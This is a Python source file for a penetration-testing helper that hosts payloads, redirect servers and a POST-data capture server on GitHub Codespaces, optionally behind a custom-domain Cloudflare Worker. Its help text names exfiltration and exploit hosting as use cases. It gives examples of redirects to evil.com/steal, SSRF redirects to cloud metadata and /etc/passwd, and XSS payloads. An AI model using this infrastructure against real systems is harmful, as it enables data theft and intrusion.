#!/usr/bin/env python3
"""
cs-serve - File server via GitHub Codespaces.

Hosts files, directories, redirect servers, and custom HTTP response servers
through a Codespace, producing public HTTPS URLs on app.github.dev.
"""

import subprocess
import time
from pathlib import Path
from typing import Optional

from .github import GitHubManager
from .templates import (
    FILE_SERVER_SCRIPT as _FILE_SERVER_SCRIPT,  # noqa: F401
    REDIRECT_SERVER_SCRIPT as _REDIRECT_SERVER_SCRIPT,  # noqa: F401
    CUSTOM_SERVER_SCRIPT as _CUSTOM_SERVER_SCRIPT,  # noqa: F401
    CAPTURE_SERVER_SCRIPT as _CAPTURE_SERVER_SCRIPT,  # noqa: F401
)
from .utils import Config, get_logger

VERSION = "1.0.0"
DEFAULT_PORT = 9999
SERVE_DIR = "/tmp/serve"


# =============================================================================
# Codespace helper
# Equivalent to: get_codespace() in cs-serve.sh
# =============================================================================


def _get_available_codespace(gh: GitHubManager, config: Config) -> str:
    """
    Get the Codespace to use for serving.

    Resolution order:
    1. config.codespace_name (set via -c flag or config file)
    2. CODESPACE_NAME environment variable
    3. First available (running) Codespace

    Returns:
        Codespace name

    Raises:
        RuntimeError: If no running Codespace is found
    """
    # Check config first (set by -c CLI flag or config file)
    cs_name = config.codespace_name or ''

    # Fall back to environment variable
    if not cs_name:
        import os
        cs_name = os.environ.get('CODESPACE_NAME', '')

    # Fall back to first available codespace
    if not cs_name:
        result = gh.run_gh_command(
            ['codespace', 'list', '--json', 'name,state',
             '-q', '.[] | select(.state=="Available") | .name'],
            check=False
        )
        cs_name = result.stdout.strip().splitlines()[0] if result.stdout.strip() else ''

    if not cs_name:
        raise RuntimeError(
            "No running Codespace found. Start one with: cs-proxy create"
        )

    return cs_name


# =============================================================================
# Remote execution helpers
# Equivalent to: setup_server_environment(), start_port_forwarding(),
#                verify_server_running()
# =============================================================================


def _ssh(gh: GitHubManager, cs_name: str, command: str,
         stdin: Optional[bytes] = None) -> subprocess.CompletedProcess:
    """
    Run a shell command in a Codespace via gh codespace ssh.

    Args:
        gh: GitHub manager
        cs_name: Codespace name
        command: Shell command string to execute remotely
        stdin: Optional stdin bytes to pass (for file uploads)

    Returns:
        CompletedProcess result
    """
    cmd = ['gh', 'codespace', 'ssh', '--codespace', cs_name, '--', command]
    return subprocess.run(
        cmd,
        input=stdin,
        capture_output=True,
        timeout=30
    )


def _upload_script(gh: GitHubManager, cs_name: str,
                   remote_path: str, content: str) -> None:
    """
    Upload a script to the Codespace by piping content via stdin.

    Equivalent to: cat > /remote/path via gh codespace ssh
    Uses stdin pipe instead of scp (which has path issues in gh CLI).

    Args:
        gh: GitHub manager
        cs_name: Codespace name
        remote_path: Destination path on Codespace
        content: Script content to upload
    """
    logger = get_logger()
    cmd = ['gh', 'codespace', 'ssh', '--codespace', cs_name,
           '--', f'cat > {remote_path}']
    result = subprocess.run(
        cmd,
        input=content.encode(),
        capture_output=True,
        timeout=30
    )
    if result.returncode != 0:
        raise RuntimeError(
            f"Failed to upload script to {remote_path}: "
            f"{result.stderr.decode().strip()}"
        )
    logger.debug(f"Uploaded script to Codespace:{remote_path}")


def _upload_file(gh: GitHubManager, cs_name: str,
                 local_path: Path, remote_path: str) -> None:
    """
    Upload a local file to the Codespace via stdin.

    Equivalent to: cat "$file" | gh codespace ssh ... "cat > /tmp/serve/..."

    Args:
        gh: GitHub manager
        cs_name: Codespace name
        local_path: Local file path to upload
        remote_path: Destination path on Codespace
    """
    logger = get_logger()
    content = local_path.read_bytes()
    cmd = ['gh', 'codespace', 'ssh', '--codespace', cs_name,
           '--', f'cat > {remote_path}']
    result = subprocess.run(
        cmd,
        input=content,
        capture_output=True,
        timeout=60
    )
    if result.returncode != 0:
        raise RuntimeError(
            f"Failed to upload {local_path.name}: "
            f"{result.stderr.decode().strip()}"
        )
    logger.info(f"  Uploaded: {local_path.name}")


def _setup_server_environment(gh: GitHubManager, cs_name: str, port: int) -> None:
    """
    Kill any existing servers and prepare /tmp/serve directory.

    Equivalent to setup_server_environment() in cs-serve.sh.

    Args:
        gh: GitHub manager
        cs_name: Codespace name
        port: Port to clear
    """
    logger = get_logger()
    logger.info(f"Stopping any existing server on port {port}...")

    # Kill old server processes and any process holding the port on Codespace
    _ssh(gh, cs_name,
         "pkill -9 -f 'redirect_server.py' || true; "
         "pkill -9 -f 'custom_server.py' || true; "
         "pkill -9 -f 'server.py' || true; "
         f"fuser -k -9 {port}/tcp 2>/dev/null || true; "
         f"lsof -ti:{port} | xargs kill -9 2>/dev/null || true; "
         "sleep 2")

    # Kill local port forward processes
    try:
        subprocess.run(
            ['pkill', '-f', f'gh codespace ports forward {port}'],
            capture_output=True
        )
    except FileNotFoundError:
        pass  # pkill not available (Windows)

    time.sleep(1)

    # Ensure /tmp/serve exists
    _ssh(gh, cs_name, "mkdir -p /tmp/serve")


def _start_port_forwarding(gh: GitHubManager, cs_name: str, port: int) -> subprocess.Popen:
    """
    Start port forwarding from Codespace port to local port.

    Equivalent to start_port_forwarding() in cs-serve.sh.

    Args:
        gh: GitHub manager
        cs_name: Codespace name
        port: Port to forward

    Returns:
        Popen instance for the background port forward process
    """
    logger = get_logger()
    logger.info("Setting up port forwarding...")

    # Start port forward in background
    fwd_process = subprocess.Popen(
        ['gh', 'codespace', 'ports', 'forward', f'{port}:{port}', '--codespace', cs_name],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    time.sleep(2)

    # Make port public
    gh.run_gh_command(
        ['codespace', 'ports', 'visibility', f'{port}:public', '--codespace', cs_name],
        check=False
    )

    return fwd_process


def _verify_server_running(gh: GitHubManager, cs_name: str, process_name: str) -> None:
    """
    Verify server process is running on Codespace.

    Equivalent to verify_server_running() in cs-serve.sh.

    Args:
        gh: GitHub manager
        cs_name: Codespace name
        process_name: Process name to check (e.g., 'server.py')

    Raises:
        RuntimeError: If server process is not found
    """
    logger = get_logger()
    result = _ssh(gh, cs_name, f"pgrep -f '{process_name}' && echo OK")

    if b'OK' not in result.stdout:
        # Show server log for debugging
        log_result = _ssh(gh, cs_name, "cat /tmp/serve/server.log")
        logger.error("Failed to start server. Remote log:")
        print(log_result.stdout.decode())
        raise RuntimeError(f"Failed to start {process_name} in Codespace")

    logger.info("Server started successfully")


def _tail_remote_logs(gh: GitHubManager, cs_name: str) -> None:
    """
    Stream server logs from Codespace until Ctrl+C.

    Equivalent to: gh codespace ssh ... "tail -f /tmp/serve/server.log"

    Blocks until interrupted.

    Args:
        gh: GitHub manager
        cs_name: Codespace name
    """
    try:
        subprocess.run(
            ['gh', 'codespace', 'ssh', '--codespace', cs_name,
             '--', 'tail -f /tmp/serve/server.log']
        )
    except KeyboardInterrupt:
        pass  # Normal exit


def _download_captures(gh: GitHubManager, cs_name: str) -> None:
    """
    Download captured files from the Codespace to the current working directory.

    Lists all files in /tmp/serve/captures/ and downloads each one via SSH cat.

    Args:
        gh: GitHub manager
        cs_name: Codespace name
    """
    logger = get_logger()

    result = _ssh(gh, cs_name, "ls -1 /tmp/serve/captures/ 2>/dev/null")
    if result.returncode != 0 or not result.stdout.strip():
        logger.info("No captures to download.")
        return

    stdout = result.stdout if isinstance(result.stdout, str) else result.stdout.decode()
    files = stdout.strip().splitlines()
    if not files:
        logger.info("No captures to download.")
        return

    logger.info(f"Downloading {len(files)} capture file(s)...")

    for filename in files:
        remote_path = f"/tmp/serve/captures/{filename}"
        local_path = Path(filename)

        dl_result = subprocess.run(
            ['gh', 'codespace', 'ssh', '--codespace', cs_name,
             '--', f'cat {remote_path}'],
            capture_output=True,
            timeout=30
        )

        if dl_result.returncode == 0:
            local_path.write_bytes(dl_result.stdout)
            logger.info(f"  Downloaded: {filename} ({len(dl_result.stdout)} bytes)")
        else:
            logger.warning(f"  Failed to download: {filename}")

    logger.info("All captures downloaded to current directory.")


def _show_banner(title: str, cs_name: str, port: int, **info: str) -> None:
    """
    Print the serve information banner.

    Equivalent to show_serve_info() in cs-serve.sh.

    Args:
        title: Banner title text
        cs_name: Codespace name (for URL construction)
        port: Port number
        **info: Additional key-value info lines to display
    """
    url = f"https://{cs_name}-{port}.app.github.dev/"
    sep = "=" * 60

    print(f"\n{sep}")
    print(title)
    print(sep)
    print(f"\nPublic URL:\n  {url}\n")
    for label, value in info.items():
        print(f"{label}:\n  {value}\n")
    print("Press Ctrl+C to stop serving\n")


def _launch_server(gh: GitHubManager, cs_name: str, port: int,
                   script: str, script_name: str,
                   banner_fn, domain: str = None,
                   config: 'Config' = None) -> None:
    """
    Upload a server script, start it, forward the port, show banner, and tail logs.

    This is the shared orchestrator for all serve_* functions. It handles:
    upload script -> start server -> verify -> port forward -> banner -> tail logs.

    If a domain is specified, deploys a Cloudflare Worker as a reverse proxy
    (auto-deploy with credentials, or generates the script for manual setup).

    Args:
        gh: GitHub manager
        cs_name: Codespace name
        port: Port to serve on
        script: Formatted Python script content to upload
        script_name: Remote filename (e.g., 'server.py', 'redirect_server.py')
        banner_fn: Callable(cs_name, port, domain=None) that prints the server info banner
        domain: Optional custom domain for Cloudflare Worker proxy
        config: Configuration (required if domain is set)
    """
    logger = get_logger()

    _upload_script(gh, cs_name, f"{SERVE_DIR}/{script_name}", script)

    logger.info(f"Starting server on port {port}...")
    _ssh(gh, cs_name,
         f"cd {SERVE_DIR}; nohup python3 {script_name} > server.log 2>&1 & sleep 1; exit 0")
    time.sleep(1)

    _verify_server_running(gh, cs_name, script_name)

    fwd = _start_port_forwarding(gh, cs_name, port)

    # Deploy Cloudflare Worker if domain is specified
    cf_worker = None
    if domain and config:
        from .cloudflare import setup_worker
        codespace_url = f"{cs_name}-{port}.app.github.dev"
        cf_worker = setup_worker(codespace_url, domain, config)

    banner_fn(cs_name, port, domain=domain)

    try:
        _tail_remote_logs(gh, cs_name)
    finally:
        fwd.terminate()
        if cf_worker:
            cf_worker.teardown()


# =============================================================================
# Server Functions
# Equivalent to: serve_file(), serve_directory(), serve_redirect(),
#                serve_custom()
# =============================================================================


def serve_file(file_path: Path, port: int, gh: GitHubManager,
               config: Config = None, domain: str = None) -> None:
    """
    Upload a single file to a Codespace and serve it via HTTP.

    Equivalent to serve_file() in cs-serve.sh.
    """
    logger = get_logger()

    if not file_path.exists() or not file_path.is_file():
        raise FileNotFoundError(f"File not found: {file_path}")

    config = config or Config()
    cs_name = _get_available_codespace(gh, config)
    logger.info(f"Using Codespace: {cs_name}")

    _setup_server_environment(gh, cs_name, port)

    logger.info(f"Uploading {file_path.name}...")
    _upload_file(gh, cs_name, file_path, f"{SERVE_DIR}/{file_path.name}")

    def banner(cs, p, domain=None):
        file_url = f"https://{cs}-{p}.app.github.dev/{file_path.name}"
        print(f"\n{'=' * 60}")
        print("File is now being served!")
        print(f"{'=' * 60}\n")
        print(f"File URL:\n  {file_url}\n")
        if domain:
            print(f"Custom domain:\n  https://{domain}/{file_path.name}\n")
        print(f"curl command:\n  curl -L \"{file_url}\"\n")
        print(f"wget command:\n  wget \"{file_url}\"\n")
        print(f"Local access:\n  curl http://localhost:{p}/{file_path.name}\n")
        print("Press Ctrl+C to stop serving\n")

    _launch_server(gh, cs_name, port,
                   script=_FILE_SERVER_SCRIPT.format(PORT=port),
                   script_name="server.py",
                   banner_fn=banner, domain=domain, config=config)


def serve_directory(dir_path: Path, port: int, gh: GitHubManager,
                    config: Config = None, domain: str = None) -> None:
    """
    Upload a directory to a Codespace and serve it via HTTP.

    Equivalent to serve_directory() in cs-serve.sh.
    """
    logger = get_logger()

    if not dir_path.exists() or not dir_path.is_dir():
        raise NotADirectoryError(f"Directory not found: {dir_path}")

    config = config or Config()
    cs_name = _get_available_codespace(gh, config)
    logger.info(f"Using Codespace: {cs_name}")

    # Clean /tmp/serve completely for directory serving (fresh upload)
    _setup_server_environment(gh, cs_name, port)
    _ssh(gh, cs_name, "rm -rf /tmp/serve && mkdir -p /tmp/serve")

    # Upload all files in directory (non-recursive)
    logger.info("Uploading directory contents...")
    files = [f for f in dir_path.iterdir() if f.is_file()]
    for f in files:
        _upload_file(gh, cs_name, f, f"{SERVE_DIR}/{f.name}")

    def banner(cs, p, domain=None):
        base_url = f"https://{cs}-{p}.app.github.dev/"
        print(f"\n{'=' * 60}")
        print("Directory is now being served!")
        print(f"{'=' * 60}\n")
        print(f"Base URL:\n  {base_url}\n")
        if domain:
            print(f"Custom domain:\n  https://{domain}/\n")
        print("Files available:")
        for f in files:
            print(f"  {base_url}{f.name}")
        print("\nPress Ctrl+C to stop serving\n")

    _launch_server(gh, cs_name, port,
                   script=_FILE_SERVER_SCRIPT.format(PORT=port),
                   script_name="server.py",
                   banner_fn=banner, domain=domain, config=config)


def serve_redirect(target_url: str, port: int, redirect_code: int,
                   gh: GitHubManager, config: Config = None,
                   domain: str = None) -> None:
    """
    Start an HTTP redirect server in a Codespace.

    Equivalent to serve_redirect() in cs-serve.sh.
    """
    logger = get_logger()

    config = config or Config()
    cs_name = _get_available_codespace(gh, config)
    logger.info(f"Using Codespace: {cs_name}")
    logger.info(f"Target URL: {target_url}")
    logger.info(f"Port: {port}")
    logger.info(f"Redirect type: {redirect_code}")

    _setup_server_environment(gh, cs_name, port)

    def banner(cs, p, domain=None):
        url = f"https://{cs}-{p}.app.github.dev/"
        print(f"\n{'=' * 60}")
        print("Redirect server is running!")
        print(f"{'=' * 60}\n")
        print(f"Redirect URL:\n  {url}\n")
        if domain:
            print(f"Custom domain:\n  https://{domain}/\n")
        print(f"Target:\n  {target_url}\n")
        print(f"Redirect Type:\n  HTTP {redirect_code}\n")
        print(f"Local access:\n  curl -v http://localhost:{p}/\n")
        print(f"Test with:\n  curl -v -L \"{url}\"")
        print(f"  curl -v \"{url}\" 2>&1 | grep -i location\n")
        print("Press Ctrl+C to stop\n")

    _launch_server(gh, cs_name, port,
                   script=_REDIRECT_SERVER_SCRIPT.format(
                       TARGET_URL=target_url,
                       REDIRECT_CODE=redirect_code,
                       PORT=port),
                   script_name="redirect_server.py",
                   banner_fn=banner, domain=domain, config=config)


def serve_custom(port: int, response_body: str, content_type: str,
                 status_code: int, gh: GitHubManager, config: Config = None,
                 domain: str = None) -> None:
    """
    Start a custom HTTP response server in a Codespace.

    Equivalent to serve_custom() in cs-serve.sh.
    """
    logger = get_logger()

    config = config or Config()
    cs_name = _get_available_codespace(gh, config)
    logger.info(f"Using Codespace: {cs_name}")
    logger.info(f"Port: {port}")
    logger.info(f"Status: {status_code}")
    logger.info(f"Content-Type: {content_type}")

    _setup_server_environment(gh, cs_name, port)

    def banner(cs, p, domain=None):
        url = f"https://{cs}-{p}.app.github.dev/"
        print(f"\n{'=' * 60}")
        print("Custom response server is running!")
        print(f"{'=' * 60}\n")
        print(f"URL:          {url}")
        if domain:
            print(f"Custom:       https://{domain}/")
        print(f"Local:        http://localhost:{p}/")
        print(f"Status:       {status_code}")
        print(f"Content-Type: {content_type}")
        print(f"Body:         {response_body[:60]}{'...' if len(response_body) > 60 else ''}\n")
        print("Press Ctrl+C to stop\n")

    _launch_server(gh, cs_name, port,
                   script=_CUSTOM_SERVER_SCRIPT.format(
                       RESPONSE_BODY=response_body,
                       CONTENT_TYPE=content_type,
                       STATUS_CODE=status_code,
                       PORT=port),
                   script_name="custom_server.py",
                   banner_fn=banner, domain=domain, config=config)


def serve_capture(port: int, gh: GitHubManager, config: Config = None,
                  domain: str = None) -> None:
    """
    Start a capture server that logs and saves all incoming POST data.

    Accepts any HTTP path. POST data is saved to /tmp/serve/captures/ on the
    Codespace. Base64-encoded data is auto-detected and decoded. On exit,
    all captured files are downloaded to the local working directory.

    Args:
        port: Port to listen on
        gh: GitHub manager
        config: Configuration (for codespace selection)
        domain: Optional custom domain via Cloudflare Worker
    """
    logger = get_logger()

    config = config or Config()
    cs_name = _get_available_codespace(gh, config)
    logger.info(f"Using Codespace: {cs_name}")
    logger.info(f"Port: {port}")

    _setup_server_environment(gh, cs_name, port)
    _ssh(gh, cs_name, "mkdir -p /tmp/serve/captures")

    def banner(cs, p, domain=None):
        url = f"https://{cs}-{p}.app.github.dev/"
        sep = "=" * 60
        print(f"\n{sep}")
        print("Capture server is running!")
        print(f"{sep}\n")
        print(f"Capture URL:\n  {url}\n")
        if domain:
            print(f"Custom domain:\n  https://{domain}/\n")
        print(f"Local:        http://localhost:{p}/\n")
        send_url = f"https://{domain}/" if domain else url
        print("Send data with:")
        print(f"  curl -X POST -d 'data here' {send_url}")
        print(f"  curl -X POST --data-binary @file.bin {send_url}")
        print(f"  echo -n 'SGVsbG8=' | curl -X POST -d @- {send_url}\n")
        print("Base64 payloads are auto-detected and decoded.")
        print("Captures saved to /tmp/serve/captures/ on Codespace.")
        print("On Ctrl+C, all captures will be downloaded locally.\n")
        print("Press Ctrl+C to stop and download captures\n")

    _launch_server(gh, cs_name, port,
                   script=_CAPTURE_SERVER_SCRIPT.format(PORT=port),
                   script_name="capture_server.py",
                   banner_fn=banner, domain=domain, config=config)

    _download_captures(gh, cs_name)


def stop_server(port: int, gh: GitHubManager, config: Config = None) -> None:
    """
    Stop server running on the specified port in the Codespace.

    Equivalent to stop_server() in cs-serve.sh.

    Args:
        port: Port the server is running on
        gh: GitHub manager
        config: Configuration (for codespace selection)
    """
    logger = get_logger()
    config = config or Config()
    cs_name = _get_available_codespace(gh, config)

    logger.info(f"Stopping server on port {port}...")
    _ssh(gh, cs_name, "pkill -f 'python3.*server.py' 2>/dev/null || true")

    try:
        subprocess.run(
            ['pkill', '-f', f'gh codespace ports forward {port}'],
            capture_output=True
        )
    except FileNotFoundError:
        pass

    # Tear down Cloudflare Worker if credentials are configured
    from .cloudflare import teardown_worker
    teardown_worker(port, config)

    logger.info("Server stopped")


def clean_all(gh: GitHubManager, config: Config = None) -> None:
    """
    Kill all servers and port forwards on the Codespace.

    Equivalent to clean_all() in cs-serve.sh.

    Args:
        gh: GitHub manager
        config: Configuration (for codespace selection)
    """
    logger = get_logger()
    config = config or Config()
    cs_name = _get_available_codespace(gh, config)

    logger.info(f"Cleaning up all servers and port forwards on {cs_name}...")

    logger.info("Killing remote Python servers...")
    _ssh(gh, cs_name,
         "pkill -f 'python3.*server' || true; "
         "pkill -f 'python3 -m http.server' || true")

    logger.info("Removing /tmp/serve...")
    _ssh(gh, cs_name, "rm -rf /tmp/serve")

    logger.info("Killing local port forwards...")
    try:
        subprocess.run(['pkill', '-f', 'gh codespace ports forward'], capture_output=True)
    except FileNotFoundError:
        pass

    # Tear down any Cloudflare Workers for common ports
    from .cloudflare import teardown_worker
    for port in [9999, 8080, 8888]:
        teardown_worker(port, config)

    logger.info("Checking remaining forwarded ports...")
    result = gh.run_gh_command(
        ['codespace', 'ports', '--codespace', cs_name],
        check=False
    )
    if result.stdout.strip():
        print(result.stdout)

    logger.info("Cleanup complete!")


def list_files(gh: GitHubManager, config: Config = None) -> None:
    """
    List files in /tmp/serve on the Codespace.

    Equivalent to list_files() in cs-serve.sh.

    Args:
        gh: GitHub manager
        config: Configuration (for codespace selection)
    """
    logger = get_logger()
    config = config or Config()
    cs_name = _get_available_codespace(gh, config)

    logger.info(f"Files in /tmp/serve on {cs_name}:")
    result = _ssh(gh, cs_name, "ls -la /tmp/serve/ 2>/dev/null || echo '  (no files)'")
    print(result.stdout.decode() or "  (no files)")


# =============================================================================
# Command Handlers
# Equivalent to: main() case statement in cs-serve.sh
# =============================================================================


def cmd_file(args, config: Config, gh: GitHubManager) -> int:
    """Serve a single file."""
    serve_file(
        file_path=Path(args.filepath),
        port=args.port,
        gh=gh,
        config=config,
        domain=getattr(args, 'domain', None)
    )
    return 0


def cmd_dir(args, config: Config, gh: GitHubManager) -> int:
    """Serve a directory."""
    serve_directory(
        dir_path=Path(args.directory),
        port=args.port,
        gh=gh,
        config=config,
        domain=getattr(args, 'domain', None)
    )
    return 0


def cmd_redirect(args, config: Config, gh: GitHubManager) -> int:
    """Start redirect server."""
    serve_redirect(
        target_url=args.target_url,
        port=args.port,
        redirect_code=args.code,
        gh=gh,
        config=config,
        domain=getattr(args, 'domain', None)
    )
    return 0


def cmd_custom(args, config: Config, gh: GitHubManager) -> int:
    """Start custom response server."""
    serve_custom(
        port=args.port,
        response_body=args.body,
        content_type=args.content_type,
        status_code=args.status,
        gh=gh,
        config=config,
        domain=getattr(args, 'domain', None)
    )
    return 0


def cmd_capture(args, config: Config, gh: GitHubManager) -> int:
    """Start capture server."""
    serve_capture(
        port=args.port,
        gh=gh,
        config=config,
        domain=getattr(args, 'domain', None)
    )
    return 0


def cmd_stop(args, config: Config, gh: GitHubManager) -> int:
    """Stop server on a port."""
    port = int(args.port) if hasattr(args, 'port') and args.port else DEFAULT_PORT
    stop_server(port, gh, config=config)
    return 0


def cmd_clean(args, config: Config, gh: GitHubManager) -> int:
    """Clean all servers and port forwards."""
    clean_all(gh, config=config)
    return 0


def cmd_list(args, config: Config, gh: GitHubManager) -> int:
    """List files on Codespace."""
    list_files(gh, config=config)
    return 0


def show_help() -> None:
    """
    Display cs-serve help text.

    Equivalent to show_help() in cs-serve.sh.
    """
    print(f"""cs-serve - Serve files via GitHub Codespaces v{VERSION} (Python)

USAGE:
    cs-serve [options] <command> [args...]

COMMANDS:
    file <path> [port]              Serve a single file
    dir <directory> [port]          Serve a directory
    redirect <url> [port] [code]    Redirect to URL (301/302/307/308)
    custom <port> <body> [type] [status]  Custom response
    capture [port]                  Capture POST data (base64 auto-decode)
    stop [port]                     Stop server on specific port
    clean                           Kill ALL servers and port forwards
    list                            List served files

OPTIONS:
    -c, --codespace    Codespace name to use (default: auto-select)
    -d, --domain       Custom domain via Cloudflare Worker reverse proxy
    -v, --verbose      Enable verbose output

EXAMPLES:
    # Serve a file
    cs-serve file payload.txt
    cs-serve file exploit.sh 8888

    # Serve a directory
    cs-serve dir ./payloads/

    # Redirect (default 302)
    cs-serve redirect https://evil.com/steal
    cs-serve redirect https://evil.com 9999 301

    # Redirect to internal targets (SSRF)
    cs-serve redirect http://169.254.169.254/latest/meta-data/
    cs-serve redirect http://localhost:8080/admin
    cs-serve redirect file:///etc/passwd

    # JavaScript redirect (XSS)
    cs-serve redirect "javascript:alert(document.domain)"

    # Custom response
    cs-serve custom 9999 '{{"status":"ok"}}' "application/json"
    cs-serve custom 9999 '<script>alert(1)</script>' "text/html"

    # Capture POST data
    cs-serve capture
    cs-serve capture 8080

    # Custom domain via Cloudflare Worker
    cs-serve -d dev.example.com file payload.bin
    cs-serve -d dev.example.com capture

    # Stop the server
    cs-serve stop

REDIRECT CODES:
    301  Moved Permanently (cached by browsers)
    302  Found (temporary, default)
    307  Temporary Redirect (preserves method)
    308  Permanent Redirect (preserves method)

OUTPUT:
    Public URL: https://<codespace>-<port>.app.github.dev/

USE CASES:
    - SSRF testing: Redirect to internal IPs/services
    - OAuth testing: Open redirect vulnerabilities
    - XSS: javascript: protocol redirects
    - Data capture: Log and save POST data with base64 auto-decode
    - Exfiltration: Capture data via request logging
    - Payload hosting: Serve exploit files

CUSTOM DOMAIN:
    Use -d/--domain to proxy through a Cloudflare Worker on your own domain.
    Set CLOUDFLARE_API_TOKEN and CLOUDFLARE_ACCOUNT_ID env vars for auto-deploy.
    Without credentials, a worker script is generated for manual deployment.
    The worker is automatically torn down on Ctrl+C.

NOTES:
    - Directory listing is disabled for file/dir serving
    - All requests are logged in real-time
    - CORS headers are added for custom responses
    - Port {DEFAULT_PORT} is used by default
""")


# =============================================================================
# Command Dispatch Table
# =============================================================================


SERVE_COMMANDS = {
    'file':     cmd_file,
    'dir':      cmd_dir,
    'redirect': cmd_redirect,
    'custom':   cmd_custom,
    'capture':  cmd_capture,
    'stop':     cmd_stop,
    'clean':    cmd_clean,
    'cleanup':  cmd_clean,   # Alias
    'list':     cmd_list,
}
